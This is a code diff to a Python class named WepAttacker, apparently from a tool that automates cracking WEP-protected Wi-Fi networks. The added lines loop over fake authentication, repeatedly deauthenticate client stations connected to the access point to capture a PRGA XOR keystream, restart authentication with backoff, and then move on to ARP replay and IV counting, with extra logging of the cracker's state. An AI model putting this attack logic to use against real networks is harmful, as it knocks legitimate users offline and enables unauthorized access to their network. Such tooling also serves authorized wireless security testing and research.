@@ -611,6 +611,31 @@ class WepAttacker(object):
             fake_authentication.start()
             time.sleep(1)
 
+            # TODO(xvondr20) Refactor to improve following strategy ->
+            while fake_authentication.state != FakeAuthentication.State.ok:
+                fake_authentication.update_state()
+                if fake_authentication.flags['needs_prga_xor']:
+                    # deauthenticate stations to acquire prga_xor
+                    tmp_ap = capturer.get_capture_result()[0]
+                    while not capturer.has_prga_xor():
+                        for st in tmp_ap.associated_stations:
+                            deauthenticate(self.if_mon, st)
+                            time.sleep(2)
+                    logging.debug('PRGA XOR detected')
+                    self.ap.save_prga_xor(capturer.capturing_xor_path)
+                    # stop fakeauth without prga_xor
+                    fake_authentication.clean()
+                    # start fakeauth with prga_xor
+                    fake_authentication.start()
+                if fake_authentication.flags['deauthenticated']:
+                    # wait and restart fakeauth
+                    fake_authentication.clean()
+                    logging.debug('fakeauth: 5 s backoff')
+                    time.sleep(5)
+                    fake_authentication.start()
+                    # TODO(xvondr20) What if fake_authentication is terminated without any flag?
+            # TODO <-
+
             arp_replay = ArpReplay(interface=self.if_mon, ap=self.ap)
             arp_replay.start(source_mac=self.if_mon_mac)
 
@@ -633,6 +658,8 @@ class WepAttacker(object):
                               'flags: ' + str(arp_replay.flags) + ', ' +
                               'stats: ' + str(arp_replay.stats)
                               )
+
+                logging.debug('WepCracker: ' + str(cracker.state))
 
                 logging.debug('#IV = ' + str(capturer.get_iv_sum()))
                 time.sleep(5)
